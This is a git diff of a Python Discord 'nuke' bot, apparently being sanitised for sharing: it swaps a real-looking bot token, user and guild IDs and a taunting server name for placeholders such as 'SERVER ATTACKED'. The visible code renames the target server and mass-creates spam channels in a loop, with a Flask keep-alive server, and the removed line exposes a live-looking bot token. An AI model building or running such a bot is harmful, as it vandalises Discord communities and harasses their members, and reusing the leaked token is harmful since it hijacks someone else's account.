@@ -5,7 +5,7 @@ from nextcord.ext import commands
 from flask import Flask
 from threading import Thread
 
-TOKEN = "MTQ0MjI1MDY0OTg4NTczNjk2MQ.GpLreG.oN3WJ0myq6LWUJ9DJ-aMvJ655OyewdP4AoRxPI"
+TOKEN = "TOKEN HERE"
 
 app = Flask(__name__)
 
@@ -13,13 +13,13 @@ app = Flask(__name__)
 def home():
     return "Bot en ligne !"
 
-ALLOWED_USER = 1316068882154393693
-ALLOWED_GUILD = 1440713312869286033
+ALLOWED_USER = ALLOWED USER HERE
+ALLOWED_GUILD = SERVER ATTACKED
 
 MAX_CHANNELS = 100
 SPAM_MESSAGES = 20
 
-NUKE_STOP = False   # <- variable globale
+NUKE_STOP = False   
 
 intents = nextcord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -57,7 +57,7 @@ async def nuke(ctx, amount: int = 5):
 
     # Changer le nom
     try:
-        await guild.edit(name="CHEH Touxiroux")
+        await guild.edit(name="nuked")
     except:
         pass
 
@@ -77,7 +77,7 @@ async def nuke(ctx, amount: int = 5):
         if NUKE_STOP:
             return await ctx.send("🛑 Nuke stoppé pendant la création.")
         try:
-            c = await guild.create_text_channel(f"cheh-touxiroux-{i+1}")
+            c = await guild.create_text_channel(f"nuked-{i+1}")
             new_channels.append(c)
             await asyncio.sleep(0.05)
         except:
@@ -103,10 +103,9 @@ def run_flask():
     app.run(host="0.0.0.0", port=port)
 
 Thread(target=run_flask).start()
-
-
 async def main():
     await bot.start(TOKEN)
 
 if __name__ == "__main__":
     asyncio.run(main())
+
